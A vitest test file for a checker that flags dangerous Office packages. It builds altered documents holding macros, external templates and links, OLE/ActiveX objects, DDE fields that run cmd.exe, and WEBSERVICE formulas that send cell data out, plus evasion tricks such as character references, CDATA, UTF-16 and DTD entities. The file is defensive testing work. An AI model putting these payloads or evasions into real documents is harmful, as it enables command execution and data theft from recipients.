import { mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { officeSafe } from '../app/main/office/safe';
import { readZip } from '../app/main/office/unzip';
import { zip } from '../app/main/zip';

const FIXTURES = 'tests/fixtures/office';
const dir = mkdtempSync(join(tmpdir(), 'office-safe-'));

const REL = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships';
const rel = (type: string, target: string) => `<Relationship Id="rIdX${type}" Type="${REL}/${type}" Target="${target}" TargetMode="External"/>`;
const rels = (...items: string[]) => `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${items.join('')}</Relationships>`;

/** A copy of an Office-saved fixture with some entries changed or added, saved as `name`. */
function changed(fixture: string, name: string, edit: (parts: Map<string, Buffer>) => void): string {
  const parts = new Map([...readZip(readFileSync(join(FIXTURES, fixture)))].map(([n, read]) => [n, read()]));
  edit(parts);
  const file = join(dir, name);
  writeFileSync(file, zip([...parts].map(([n, data]) => ({ name: n, data }))));
  return file;
}

/** Adds a relationship to an existing .rels part. */
const addRel = (parts: Map<string, Buffer>, part: string, item: string) =>
  parts.set(part, Buffer.from(parts.get(part)!.toString().replace('</Relationships>', `${item}</Relationships>`)));

describe('officeSafe', () => {
  it('passes the files Office saved', () => {
    for (const f of ['sample.docx', 'sample.xlsx', 'sample.pptx']) expect(officeSafe(join(FIXTURES, f)), f).toEqual({ ok: true });
  });

  it('stops a package carrying a macro project', () => {
    const file = changed('sample.docx', 'vba.docx', (p) => p.set('word/vbaProject.bin', Buffer.from('macro')));
    expect(officeSafe(file)).toEqual({ ok: false, reason: 'macros' });
  });

  it('stops a package whose main part is macro-enabled', () => {
    const file = changed('sample.xlsx', 'macro-type.xlsx', (p) => p.set('[Content_Types].xml', Buffer.from(p.get('[Content_Types].xml')!.toString()
      .replace('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml', 'application/vnd.ms-excel.sheet.macroEnabled.main+xml'))));
    expect(readFileSync(file).length).toBeGreaterThan(0);
    expect(officeSafe(file)).toEqual({ ok: false, reason: 'macros' });
  });

  it('stops a template fetched from outside', () => {
    const file = changed('sample.docx', 'template.docx', (p) => p.set('word/_rels/settings.xml.rels', Buffer.from(rels(rel('attachedTemplate', 'https://example.com/t.dotm')))));
    expect(officeSafe(file)).toEqual({ ok: false, reason: 'externalTemplate' });
  });

  it('stops an object or a workbook link that points outside', () => {
    const ole = changed('sample.docx', 'ole.docx', (p) => addRel(p, 'word/_rels/document.xml.rels', rel('oleObject', 'file:///C:/x.xlsx')));
    expect(officeSafe(ole)).toEqual({ ok: false, reason: 'externalLink' });
    const link = changed('sample.xlsx', 'link.xlsx', (p) => p.set('xl/externalLinks/_rels/externalLink1.xml.rels', Buffer.from(rels(rel('externalLinkPath', 'file:///\\\\server\\share\\book.xlsx')))));
    expect(officeSafe(link)).toEqual({ ok: false, reason: 'externalLink' });
  });

  it('lets a plain web link through', () => {
    const file = changed('sample.pptx', 'link.pptx', (p) => addRel(p, 'ppt/slides/_rels/slide2.xml.rels', rel('hyperlink', 'https://example.com/')));
    expect(officeSafe(file)).toEqual({ ok: true });
  });

  it('stops embedded objects and controls, even ones kept inside the package', () => {
    const ole = changed('sample.docx', 'embedded.docx', (p) => p.set('word/embeddings/oleObject1.bin', Buffer.from('ole')));
    expect(officeSafe(ole)).toEqual({ ok: false, reason: 'embedded' });
    const control = changed('sample.pptx', 'control.pptx', (p) => addRel(p, 'ppt/slides/_rels/slide2.xml.rels',
      `<Relationship Id="rIdC" Type="${REL}/control" Target="../activeX/activeX1.xml"/>`));
    expect(officeSafe(control)).toEqual({ ok: false, reason: 'embedded' });
  });

  it('stops fields that fetch or run something, even split across runs; a web link field stays', () => {
    const field = (code: string) => code.split('|').map((c) => `<w:r><w:instrText xml:space="preserve">${c}</w:instrText></w:r>`).join('');
    const withBody = (name: string, para: string) => changed('sample.docx', name, (p) => p.set('word/document.xml',
      Buffer.from(p.get('word/document.xml')!.toString().replace('</w:body>', `<w:p>${para}</w:p></w:body>`))));
    expect(officeSafe(withBody('dde.docx', field(' DDE|AUTO c:\\windows\\system32\\cmd.exe "/k calc" ')))).toEqual({ ok: false, reason: 'externalLink' });
    expect(officeSafe(withBody('include.docx', '<w:fldSimple w:instr=" INCLUDEPICTURE &quot;http://example.com/a.png&quot; \d "/>'))).toEqual({ ok: false, reason: 'externalLink' });
    expect(officeSafe(withBody('hyperlink.docx', field(' HYPERLINK "https://example.com/" ')))).toEqual({ ok: true });
  });

  it('stops a workbook formula that reaches outside', () => {
    const formula = (name: string, f: string) => changed('sample.xlsx', name, (p) => p.set('xl/worksheets/sheet1.xml',
      Buffer.from(p.get('xl/worksheets/sheet1.xml')!.toString().replace(/<f>[^<]*<\/f>/, `<f>${f}</f>`))));
    for (const [name, f] of [
      ['webservice.xlsx', 'WEBSERVICE("http://example.com/?"&amp;A1)'],
      ['dde.xlsx', "cmd|'/c calc'!A0"],
      ['external.xlsx', '[1]Sheet1!A1'],
    ]) expect(officeSafe(formula(name, f)), name).toEqual({ ok: false, reason: 'externalLink' });
    expect(officeSafe(formula('sum.xlsx', 'SUM(B2:B3)'))).toEqual({ ok: true });
  });

  it('reads the parts as Office does: character references, prefixes, defined names and every Word part', () => {
    const sheet = (name: string, edit: (xml: string) => string) => changed('sample.xlsx', name, (p) =>
      p.set('xl/worksheets/sheet1.xml', Buffer.from(edit(p.get('xl/worksheets/sheet1.xml')!.toString()))));
    expect(officeSafe(sheet('charref.xlsx', (x) => x.replace(/<f>[^<]*<\/f>/, '<f>&#87;EBSERVICE("http://example.com/")</f>')))).toEqual({ ok: false, reason: 'externalLink' });
    expect(officeSafe(sheet('prefix.xlsx', (x) => x.replace(/<f>[^<]*<\/f>/, '<x:f>WEBSERVICE("http://example.com/")</x:f>')))).toEqual({ ok: false, reason: 'externalLink' });
    expect(officeSafe(sheet('cdata.xlsx', (x) => x.replace(/<f>[^<]*<\/f>/, '<f><![CDATA[WEBSERVICE("http://example.com/")]]></f>')))).toEqual({ ok: false, reason: 'externalLink' });
    const named = changed('sample.xlsx', 'named.xlsx', (p) => p.set('xl/workbook.xml', Buffer.from(p.get('xl/workbook.xml')!.toString()
      .replace('</workbook>', '<definedNames><definedName name="leak">WEBSERVICE("http://example.com/")</definedName></definedNames></workbook>'))));
    expect(officeSafe(named)).toEqual({ ok: false, reason: 'externalLink' });
    const charref = changed('sample.docx', 'charref.docx', (p) => p.set('word/document.xml', Buffer.from(p.get('word/document.xml')!.toString()
      .replace('</w:body>', '<w:p><w:r><w:instrText> &#68;DEAUTO c:\\x.exe </w:instrText></w:r></w:p></w:body>'))));
    expect(officeSafe(charref)).toEqual({ ok: false, reason: 'externalLink' });
    const header = changed('sample.docx', 'header.docx', (p) => p.set('word/sub/header9.xml', Buffer.from(
      '<w:hdr xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:p><w:fldSimple w:instr=" INCLUDETEXT &quot;\\\\server\\a.docx&quot; "/></w:p></w:hdr>')));
    expect(officeSafe(header)).toEqual({ ok: false, reason: 'externalLink' });
  });

  it('is not fooled by brackets, nesting, doubled attributes, odd part names, UTF-16 or a DTD', () => {
    const W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"';
    const wordPart = (name: string, part: string, body: string | Buffer) => changed('sample.docx', name, (p) => p.set(part, typeof body === 'string' ? Buffer.from(body) : body));
    const tableTrick = changed('sample.xlsx', 'table-trick.xlsx', (p) => p.set('xl/worksheets/sheet1.xml', Buffer.from(p.get('xl/worksheets/sheet1.xml')!.toString()
      .replace(/<f>[^<]*<\/f>/, '<f>Table1[a"b]&amp;WEBSERVICE("http://example.com/")&amp;Table1[c"d]</f>'))));
    expect(officeSafe(tableTrick), 'table').toEqual({ ok: false, reason: 'externalLink' });
    const nested = `<w:document ${W}><w:body><w:p><w:fldSimple w:instr=" PAGE "><w:r><w:fldSimple w:instr=" INCLUDETEXT &quot;x.docx&quot; "/></w:r></w:fldSimple></w:p></w:body></w:document>`;
    expect(officeSafe(wordPart('nested.docx', 'word/document.xml', nested)), 'nested').toEqual({ ok: false, reason: 'externalLink' });
    const doubled = `<w:document ${W} xmlns:x="urn:x"><w:body><w:p><w:fldSimple w:instr=" INCLUDETEXT &quot;x.docx&quot; " x:instr=" PAGE "/></w:p></w:body></w:document>`;
    expect(officeSafe(wordPart('doubled.docx', 'word/document.xml', doubled)), 'doubled').toEqual({ ok: false, reason: 'externalLink' });
    const field = `<w:hdr ${W}><w:p><w:r><w:instrText> INCLUDETEXT "x.docx" </w:instrText></w:r></w:p></w:hdr>`;
    expect(officeSafe(wordPart('oddname.docx', 'word/header-part.bin', field)), 'odd name').toEqual({ ok: false, reason: 'externalLink' });
    expect(officeSafe(wordPart('utf16.docx', 'word/header9.xml', Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(field, 'utf16le')]))), 'utf16').toEqual({ ok: false, reason: 'externalLink' });
    expect(officeSafe(wordPart('dtd.docx', 'word/header9.xml', `<!DOCTYPE w:hdr [<!ENTITY e "INCLUDETEXT">]>${field}`)), 'dtd').toEqual({ ok: false, reason: 'unreadable' });
    const rel = changed('sample.docx', 'rel-clash.docx', (p) => addRel(p, 'word/_rels/document.xml.rels',
      `<Relationship xmlns:x="urn:x" Id="rIdY" Type="${REL}/oleObject" x:Type="${REL}/hyperlink" Target="file:///C:/x.xlsx" TargetMode="External"/>`));
    expect(officeSafe(rel), 'rel clash').not.toEqual({ ok: true });
  });

  it('reads a tag to its real end, and refuses encodings it cannot be sure of', () => {
    const cell = (name: string, f: string) => changed('sample.xlsx', name, (p) => p.set('xl/worksheets/sheet1.xml', Buffer.from(p.get('xl/worksheets/sheet1.xml')!.toString()
      .replace(/<f>[^<]*<\/f>/, f))));
    expect(officeSafe(cell('slash-attr.xlsx', '<f t="a/>">WEBSERVICE("http://example.com/")</f>')), 'slash in attr').not.toEqual({ ok: true });
    expect(officeSafe(cell('gt-attr.xlsx', "<f t='>'>WEBSERVICE(\"http://example.com/\")</f>")), 'gt in attr').not.toEqual({ ok: true });
    expect(officeSafe(cell('plain-attr.xlsx', '<f t="normal">SUM(B2:B3)</f>')), 'ordinary attr').toEqual({ ok: true });
    const header = (name: string, body: Buffer) => changed('sample.docx', name, (p) => p.set('word/header9.xml', body));
    const field = '<w:hdr xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:p><w:r><w:instrText> PAGE </w:instrText></w:r></w:p></w:hdr>';
    expect(officeSafe(header('declared-16.docx', Buffer.from(`<?xml version="1.0" encoding="UTF-16"?>${field}`))), 'utf-16 declared, utf-8 bytes').toEqual({ ok: false, reason: 'unreadable' });
    expect(officeSafe(header('declared-other.docx', Buffer.from(`<?xml version="1.0" encoding="windows-1252"?>${field}`))), 'other encoding').toEqual({ ok: false, reason: 'unreadable' });
    expect(officeSafe(header('no-bom-16.docx', Buffer.from(field, 'utf16le'))), 'utf-16 without a mark').toEqual({ ok: false, reason: 'unreadable' });
    expect(officeSafe(header('utf8-declared.docx', Buffer.from(`<?xml version="1.0" encoding="UTF-8" standalone="yes"?>${field}`))), 'utf-8 declared').toEqual({ ok: true });
  });

  it('calls a package with two parts of the same name unreadable', () => {
    const file = changed('sample.docx', 'twice.docx', (p) => p.set('WORD/document.xml', p.get('word/document.xml')!));
    expect(officeSafe(file)).toEqual({ ok: false, reason: 'unreadable' });
  });

  it('calls what it cannot open unreadable', () => {
    writeFileSync(join(dir, 'garbage.docx'), Buffer.from('this is not a zip file at all'));
    expect(officeSafe(join(dir, 'garbage.docx'))).toEqual({ ok: false, reason: 'unreadable' });
    writeFileSync(join(dir, 'many.docx'), zip(Array.from({ length: 5_001 }, (_, i) => ({ name: `p${i}.xml`, data: '<a/>' }))));
    expect(officeSafe(join(dir, 'many.docx'))).toEqual({ ok: false, reason: 'unreadable' });
  });
});
